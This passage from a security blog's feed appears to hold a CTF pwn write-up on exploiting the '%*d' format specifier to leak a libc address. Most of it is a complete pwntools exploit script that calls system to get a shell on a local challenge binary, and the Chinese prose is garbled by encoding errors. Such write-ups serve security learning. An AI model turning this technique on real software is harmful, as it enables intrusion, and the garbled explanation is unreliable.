    <summary type="html">TLSåŠ«æŒè¿‡canary</summary>
    
    
    
    <category term="canary" scheme="https://www.thir0th.xyz/categories/canary/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fmtä¸­%*dçš„åˆ©ç”¨</title>
    <link href="https://www.thir0th.xyz/posts/1bb30b9a.html"/>
    <id>https://www.thir0th.xyz/posts/1bb30b9a.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-04-19T16:15:20.332Z</updated>
    
    <content type="html"><![CDATA[<p>corectfçš„ä¸€é“é¢˜ï¼Œè§è¯†åˆ°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–°ç”¨æ³•%*d</p><p>æŒ‡é’ˆæ®‹ç•™ï¼Œç”±ä¸è§„èŒƒä½¿ç”¨å‡½æ•°é€ æˆã€‚</p><p>printf(â€œ%*dâ€,&amp;a,&amp;b) æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨rdiï¼Œaå’Œbæ²¡æœ‰è§„å®šä½†ä¼šå–rsi rdxä¸­çš„å€¼</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/43448046/1722575576346-a39674ea-bb70-4ca5-99a2-6aa5300f2689.jpeg" alt=""></p><p>do_printfå‡½æ•°ä¸­ï¼Œåªå…è®¸è¯»å…¥ä¸‰ä¸ªå­—èŠ‚ï¼Œprintf hereçš„rsiä¼šæ®‹ç•™åˆ°ç¬¬äºŒæ¬¡printf,ç¬¬äºŒä¸ªprintfæ­¤æ—¶rsiæ˜¯ä¸€ä¸ªå æ ˆåœ°å€ï¼Œæ•°å¾ˆå¤§ï¼Œè¾“å‡ºä¼šæŠŠç¼“å†²åŒºå¡«æ»¡ï¼Œç¼“å†²åŒºæœ€åæœ‰libcåœ°å€ï¼Œ%sä¼šç›´æ¥æŠŠlibcåœ°å€æ‰“å°å‡ºæ¥ï¼Œæ‹¿åˆ°libcåç›´æ¥è¾“å…¥system(è°ƒè¯•æœ‰ç‚¹è´¹CPUï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è™šæ‹Ÿæœºå¡æ­»)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575384708-1f6f2c67-9410-44b8-b21e-06fa02b13c79.png" alt=""><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575721265-4b11ded9-d96d-49e5-97e1-aa9e6d8c1376.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722575944381-ce16043b-4f70-4303-a974-de388757ee45.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x1100)&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%*d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 3&quot;</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pr(<span class="built_in">hex</span>(libc))</span><br><span class="line">system=libc-<span class="number">0x19a6f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fmtä¸­%*dçš„åˆ©ç”¨</summary>
    
    
    
    <category term="canary" scheme="https://www.thir0th.xyz/categories/canary/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
</feed>
